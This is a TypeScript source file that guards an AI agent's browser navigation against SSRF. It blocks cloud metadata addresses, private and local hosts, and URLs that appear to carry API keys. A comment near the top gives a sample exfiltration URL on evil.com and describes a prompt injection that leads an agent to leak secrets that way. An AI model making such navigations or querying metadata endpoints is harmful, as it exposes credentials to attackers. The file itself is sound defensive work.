import { isIPv4, isIPv6 } from 'node:net';

/**
 * Cloud metadata hostnames that are ALWAYS blocked regardless of any config toggle.
 * These are credential-exfiltration targets for SSRF attacks and have zero legitimate
 * agent use cases. Aligned with hermes-agent `_BLOCKED_HOSTNAMES`.
 */
const ALWAYS_BLOCKED_HOSTNAMES = new Set([
  'metadata.google.internal',
  'metadata.goog',
]);

/**
 * Cloud metadata / IMDS IPv4 addresses — always blocked regardless of `allowPrivateUrls`.
 * Covers AWS, GCP, Azure, DigitalOcean, Oracle, Alibaba Cloud, and ECS task metadata.
 */
const ALWAYS_BLOCKED_IPV4 = new Set([
  '169.254.169.254', // AWS/GCP/Azure/DO/Oracle metadata
  '169.254.170.2',   // AWS ECS task metadata (IAM creds)
  '169.254.169.253', // Azure IMDS wire server
  '100.100.100.200', // Alibaba Cloud metadata
]);

/**
 * Regex to detect API keys / tokens embedded in URLs.
 * Catches common prefixes: sk-ant-, sk-, OPENAI_API_KEY=, key=, token=, etc.
 * A prompt injection could trick the agent into navigating to
 * `https://evil.com/steal?key=sk-ant-...` to exfiltrate secrets.
 */
const API_KEY_PATTERN =
  /(?:sk-ant-|sk-[a-zA-Z0-9]{20,}|OPENAI_API_KEY|ANTHROPIC_API_KEY|api[_-]?key\s*=\s*[a-zA-Z0-9_-]{20,}|bearer\s+[a-zA-Z0-9_.-]{20,})/i;

// ── Public API ────────────────────────────────────────────────────────────────

/**
 * SSRF-style guard for browser navigation.
 *
 * Validates: protocol (http/https), no embedded credentials, no private IPs,
 * no cloud metadata endpoints, no API key exfiltration attempts.
 *
 * @param raw URL string from the agent
 * @param options.allowPrivateUrls When true, skip private-IP blocking (cloud metadata still blocked)
 */
export function assertBrowserUrlAllowed(
  raw: string,
  options?: { allowPrivateUrls?: boolean },
): void {
  const parsed = parseAndValidateUrl(raw);
  assertNotApiKeyExfiltration(raw);
  assertNotAlwaysBlocked(parsed.hostname);
  assertNotPrivate(parsed.hostname, options?.allowPrivateUrls ?? false);
}

/**
 * Check whether a URL targets an always-blocked cloud metadata endpoint.
 * Used for post-redirect verification — the navigate tool checks the *final* URL
 * after redirects, not just the initial one.
 *
 * Returns `true` (= blocked) for:
 * - Hostnames in {@link ALWAYS_BLOCKED_HOSTNAMES}
 * - IPs in {@link ALWAYS_BLOCKED_IPV4}
 * - Any address in the 169.254.0.0/16 link-local range
 */
export function isAlwaysBlockedUrl(raw: string): boolean {
  try {
    const url = new URL(raw.trim());
    const host = url.hostname.toLowerCase();
    if (ALWAYS_BLOCKED_HOSTNAMES.has(host)) return true;
    if (ALWAYS_BLOCKED_IPV4.has(host)) return true;
    if (isIPv4(host) && isLinkLocal(host)) return true;
    return false;
  } catch {
    return false;
  }
}

/**
 * Check whether a URL contains patterns that look like API keys or tokens.
 * Prevents prompt-injection exfiltration via browser navigation.
 */
export function containsApiKeyPattern(raw: string): boolean {
  try {
    const decoded = decodeURIComponent(raw);
    return API_KEY_PATTERN.test(raw) || API_KEY_PATTERN.test(decoded);
  } catch {
    return API_KEY_PATTERN.test(raw);
  }
}

/**
 * Validate a final URL after redirect — blocks private/internal targets
 * that the original URL may have redirected to.
 *
 * @returns Error message string if blocked, `undefined` if safe.
 */
export function checkPostRedirectUrl(
  finalUrl: string,
  options?: { allowPrivateUrls?: boolean },
): string | undefined {
  if (isAlwaysBlockedUrl(finalUrl)) {
    return 'Blocked: redirect landed on a cloud metadata endpoint';
  }

  if (options?.allowPrivateUrls) return undefined;

  try {
    const url = new URL(finalUrl.trim());
    const host = url.hostname.toLowerCase();

    if (host === 'localhost' || host.endsWith('.localhost')) {
      return 'Blocked: redirect landed on localhost';
    }
    if (isIPv4(host) && isBlockedIPv4(host)) {
      return 'Blocked: redirect landed on a private/internal address';
    }
    if (isIPv6(host) && isBlockedIPv6(host)) {
      return 'Blocked: redirect landed on a private/loopback IPv6 address';
    }
    if (host.endsWith('.local') || host.endsWith('.internal')) {
      return 'Blocked: redirect landed on an internal hostname';
    }
  } catch {
    // Malformed final URL — let it through; browser will fail on its own.
  }
  return undefined;
}

// ── Internal helpers ──────────────────────────────────────────────────────────

function parseAndValidateUrl(raw: string): URL {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    throw new Error('Invalid URL');
  }

  if (url.username || url.password) {
    throw new Error('URLs with embedded credentials are not allowed');
  }

  if (url.protocol !== 'http:' && url.protocol !== 'https:') {
    throw new Error('Only http and https URLs are allowed');
  }

  if (!url.hostname) {
    throw new Error('Missing hostname');
  }

  return url;
}

function assertNotApiKeyExfiltration(raw: string): void {
  if (containsApiKeyPattern(raw)) {
    throw new Error(
      'Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs.',
    );
  }
}

function assertNotAlwaysBlocked(hostname: string): void {
  const host = hostname.toLowerCase();
  if (ALWAYS_BLOCKED_HOSTNAMES.has(host)) {
    throw new Error('Blocked: cloud metadata endpoint');
  }
  if (ALWAYS_BLOCKED_IPV4.has(host)) {
    throw new Error('Blocked: cloud metadata address');
  }
  if (isIPv4(host) && isLinkLocal(host)) {
    throw new Error('Blocked: link-local address (cloud metadata range)');
  }
}

function assertNotPrivate(hostname: string, allowPrivate: boolean): void {
  const host = hostname.toLowerCase();

  if (host === 'localhost' || host.endsWith('.localhost')) {
    throw new Error('Blocked: localhost');
  }

  if (isIPv4(host)) {
    if (!allowPrivate && isBlockedIPv4(host)) {
      throw new Error('Blocked: private or non-public IPv4 address');
    }
    return;
  }

  if (isIPv6(host)) {
    if (!allowPrivate && isBlockedIPv6(host)) {
      throw new Error('Blocked: private or loopback IPv6 address');
    }
    return;
  }

  if (host.endsWith('.local') || host.endsWith('.internal')) {
    throw new Error('Blocked: internal hostname');
  }
}

function isLinkLocal(host: string): boolean {
  const parts = host.split('.').map((p) => Number(p));
  if (parts.length !== 4) return false;
  return parts[0] === 169 && parts[1] === 254;
}

function isBlockedIPv4(host: string): boolean {
  const parts = host.split('.').map((p) => Number(p));
  if (parts.length !== 4 || parts.some((n) => !Number.isInteger(n) || n < 0 || n > 255)) {
    return true;
  }
  const [a, b] = parts;
  if (a === 10) return true;
  if (a === 127) return true;
  if (a === 0) return true;
  if (a === 169 && b === 254) return true;
  if (a === 192 && b === 168) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 100 && b >= 64 && b <= 127) return true; // CGNAT 100.64.0.0/10
  return false;
}

function isBlockedIPv6(host: string): boolean {
  const h = host.toLowerCase().replace(/^\[|\]$/g, '');
  if (h === '::1') return true;
  if (h.startsWith('fe80:')) return true; // link-local
  if (h.startsWith('fc') || h.startsWith('fd')) return true; // ULA fc00::/7
  return false;
}
